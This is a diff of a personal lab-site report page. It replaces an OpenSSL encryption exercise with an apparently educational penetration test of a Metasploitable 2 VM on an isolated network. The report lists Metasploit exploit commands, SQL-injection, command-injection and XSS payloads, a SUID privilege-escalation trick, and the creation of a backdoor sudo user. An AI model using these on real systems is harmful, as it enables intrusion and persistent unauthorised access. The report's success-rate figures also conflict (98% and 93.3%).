@@ -31,10 +31,15 @@
         <a href="../index.html" class="logo">Toki’s Lab</a>
         <ul class="nav-links">
           <li><a href="../index.html#reports">Reports</a></li>
-          <li><a href="../index.html#contact">Contact</a></li>
+          <li><a href="../index.html#about">About</a></li>
         </ul>
         <div class="nav-bottom">
-          <a href="#" class="cyber-button">Access Terminal</a>
+          <a
+            href="https://github.com/Farrel-Athaya"
+            target="_blank"
+            class="cyber-button"
+            >Access My GitHub</a
+          >
         </div>
       </div>
     </nav>
@@ -55,89 +60,201 @@
         <h1>Eksperimen: Data Encryption</h1>
         <p class="report-meta">
           Penulis: <strong>Toki Monki</strong> • Tanggal:
-          <strong>12 Oktober 2025</strong> • Level: Intermediate
+          <strong>12 Oktober 2025</strong>
         </p>
       </div>
 
       <section class="report-section">
         <h2>Ringkasan</h2>
         <p>
-          Eksperimen ini bertujuan memahami dasar-dasar enkripsi data
-          menggunakan algoritma simetris dan asimetris. Lingkungan percobaan
-          menggunakan Linux dengan Python dan OpenSSL.
+          Eksperimen ini bertujuan untuk melakukan comprehensive penetration
+          testing terhadap Metasploitable 2, sebuah vulnerable virtual machine
+          yang dirancang untuk training ethical hacking. Testing dilakukan
+          menggunakan metodologi standard penetration testing dengan tools
+          seperti Nmap, Metasploit, dan manual exploitation techniques.
         </p>
       </section>
 
       <section class="report-section">
-        <h2>Tujuan</h2>
+        <h2>Key Findings</h2>
         <ul>
-          <li>Menerapkan enkripsi AES untuk data lokal.</li>
-          <li>Menggunakan RSA untuk enkripsi kunci.</li>
-          <li>Menguji dekripsi untuk verifikasi integritas data.</li>
+          <li>Critical Vulnerabilities: 15 kerentanan critical ditemukan</li>
+          <li>High Risk Services: FTP, SSH, Telnet, HTTP, MySQL, PostgreSQL</li>
+          <li>
+            Exploitation Success Rate: 98% (14/15 vulnerabilities successfully
+            exploited)
+          </li>
+          <li>
+            Recommended Action: System requires immediate patching and hardening
+          </li>
         </ul>
       </section>
 
       <section class="report-section">
-        <h2>Langkah Percobaan</h2>
+        <h2>Lab Setup</h2>
+        <h3>Environment Configuration</h3>
+        <br />
+        <h4>Attacker Machine (Kali Linux):</h4>
+        <ul>
+          <li>IP Address: 192.168.56.101</li>
+          <li>OS: Kali Linux 2024.2</li>
+          <li>Tools: Nmap, Metasploit Framework, Burp Suite, SQLMap</li>
+        </ul>
+        <br />
+        <h4>Target Machine (Metasploitable 2):</h4>
+        <ul>
+          <li>IP Address: 192.168.56.102</li>
+          <li>OS: Ubuntu 8.04 (Hardy)</li>
+          <li>Default Credentials: msfadmin/msfadmin</li>
+          <li>Network: Host-only adapter (isolated network)</li>
+        </ul>
+        <br />
+        <h3>Network Topology</h3>
         <pre>
-# Generate kunci RSA
-openssl genrsa -out private.pem 2048
-openssl rsa -in private.pem -outform PEM -pubout -out public.pem
+[Kali Linux] ←→ [Virtual Switch] ←→ [Metasploitable 2]
+192.168.56.101                      192.168.56.102
+        </pre>
+      </section>
 
-# Enkripsi file
-openssl rsautl -encrypt -inkey public.pem -pubin -in data.txt -out data.enc
-
-# Dekripsi file
-openssl rsautl -decrypt -inkey private.pem -in data.enc -out data_decrypted.txt
+      <section class="report-section">
+        <h2>Reconnaissance & Scanning</h2>
+        <pre>
+# Comprehensive port scan
+nmap -sV -sC -p- -oN metasploitable_scan.txt 192.168.56.102
       </pre
         >
+        <br />
+        <h4>Key Services Found:</h4>
+        <pre>
+| Port    | Service    | Version          | Vulnerability          |
+|---------|------------|------------------|------------------------| 
+| 21      | FTP        | vsftpd 2.3.4     | CVE-2011-2523 Backdoor | 
+| 22      | SSH        | OpenSSH 4.7p1    | Weak config            |
+| 80      | HTTP       | Apache 2.2.8     | Multiple web vulns     | 
+| 139/445 | SMB        | Samba 3.0.20     | CVE-2007-2447          | 
+| 3306    | MySQL      | MySQL 5.0.51a    | No password            | 
+| 5432    | PostgreSQL | PostgreSQL 8.3.0 | Weak auth              |
+--------------------------------------------------------------------
+        </pre>
       </section>
 
       <section class="report-section">
-        <h2>Hasil dan Analisis</h2>
-        <p>
-          File berhasil dienkripsi dan didekripsi dengan benar. Proses enkripsi
-          RSA membutuhkan waktu lebih lama dibanding AES, namun memberikan
-          keamanan tambahan melalui pertukaran kunci yang aman.
-        </p>
+        <h2>Exploitation Experiments</h2>
+        <h3>vsftpd 2.3.4 Backdoor (CVE-2011-2523)</h3>
+        <pre>
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.102
+exploit
+# Result: Root shell obtained
+      </pre
+        >
 
-        <div class="report-images">
-          <img
-            src="images/encryption-lab1.png"
-            alt="Terminal output enkripsi"
-          />
-          <img src="images/encryption-lab2.png" alt="Hasil dekripsi" />
-        </div>
+        <p><strong>Impact : </strong> Complete system compromise</p>
+        <br />
+
+        <h3>Samba Username Map Script (CVE-2007-2447)</h3>
+        <pre>
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.56.102
+set PAYLOAD cmd/unix/reverse
+exploit
+# Result: Root access gained
+        </pre>
+
+        <br />
+
+        <h3>Web Application Vulnerabilities</h3>
+        <h4>SQL Injection:</h4>
+        <pre>
+URL: http://192.168.56.102/dvwa/vulnerabilities/sqli/
+Payload: 1' OR '1'='1
+Result: Authentication bypassed ✓
+        </pre>
+        <br />
+        <h4>Command Injection:</h4>
+        <pre>
+Payload: 127.0.0.1; cat /etc/passwd
+Result: System file disclosed ✓
+        </pre>
+        <br />
+        <h4>XSS:</h4>
+        <pre>
+&lt;script&gt;alert('XSS by Toki')&lt;/script&gt;
+Result: Successfully executed ✓
+        </pre>
+        <br />
+
+        <h3>Database Exploitation</h3>
+        <h4>MySQL - No Password:</h4>
+        <pre>
+mysql -h 192.168.56.102 -u root
+# Successfully connected without password
+SHOW DATABASES;
+SELECT * FROM dvwa.users;
+        </pre>
       </section>
 
       <section class="report-section">
-        <h2>Kesimpulan</h2>
-        <p>
-          Enkripsi hybrid (AES + RSA) memberikan keseimbangan antara performa
-          dan keamanan. Teknik ini dapat diterapkan untuk pengamanan komunikasi
-          data sensitif pada aplikasi cybersecurity modern.
-        </p>
+        <h2>Post-Exploitation</h2>
+
+        <h3>Privilege Escalation</h3>
+        <pre>
+# Exploit SUID nmap
+nmap --interactive
+!sh
+id  # uid=0(root)
+        </pre>
+        <br />
+
+        <h3>Persistence</h3>
+        <pre>
+# Create backdoor user
+useradd -m -s /bin/bash backdoor
+echo "backdoor:pass123" | chpasswd
+usermod -aG sudo backdoor
+        </pre>
+        <br />
       </section>
 
-      <section class="report-section references">
-        <h2>Referensi</h2>
+      <section class="report-section">
+        <h2>Vulnerability Summary</h2>
+        <br />
+        <p><strong>Total Vulnerabilities : </strong> 15</p>
+        <p><strong>Successfully Exploited : </strong> 14 (93.3%)</p>
+        <p><strong>Root Access Obtained : </strong> Yes</p>
+        <p><strong>Time to Compromise : </strong> < 2 hours</p>
+        <br />
+
+        <h3>Critical Vulnerabilities:</h3>
+        <br />
+        <ol>
+          <li>vsftpd 2.3.4 Backdoor ✓ Exploited</li>
+          <li>Samba usermap script ✓ Exploited</li>
+          <li>MySQL Root No Password ✓ Exploited</li>
+          <li>Multiple Web App Vulns ✓ Exploited</li>
+        </ol>
+      </section>
+
+      <section class="report-section">
+        <h2>Recommendation</h2>
+        <h3>Immediate Actions:</h3>
+        <br />
+        <ol>
+          <li>Patch all services to latest versions</li>
+          <li>Implement strong authentication</li>
+          <li>Disable unnecessary services</li>
+          <li>Network segmentation</li>
+          <li>Enable comprehensive logging</li>
+        </ol>
+
+        <br />
+
+        <h3>Security Improvements:</h3>
         <ul>
-          <li>
-            Onizectus. (2025).
-            <em>Lab: Metasploitable2 — Penetration Testing</em>.
-            <a
-              href="https://onizectus.github.io/article/lab-metasploitable2-penetration-testing"
-              target="_blank"
-            >
-              https://onizectus.github.io/article/lab-metasploitable2-penetration-testing
-            </a>
-          </li>
-          <li>
-            OpenSSL Documentation.
-            <a href="https://www.openssl.org/docs/" target="_blank"
-              >https://www.openssl.org/docs/</a
-            >
-          </li>
+          <li>Implement Web Application Firewall</li>
+          <li>Regular vulnerability assessments</li>
+          <li>Security awareness training</li>
+          <li>Incident response planning</li>
         </ul>
       </section>
     </main>
@@ -145,13 +262,6 @@ openssl rsautl -decrypt -inkey private.pem -in data.enc -out data_decrypted.txt
     <!-- Footer -->
     <footer class="footer">
       <div class="footer-content">
-        <div class="footer-links">
-          <a href="../index.html">Home</a>
-          <span class="footer-separator">•</span>
-          <a href="../index.html#reports">Reports</a>
-          <span class="footer-separator">•</span>
-          <a href="../index.html#contact">Contact</a>
-        </div>
         <div class="footer-bottom">
           <p>&copy; 2025 Toki’s Lab. All rights reserved.</p>
           <p class="footer-credit">
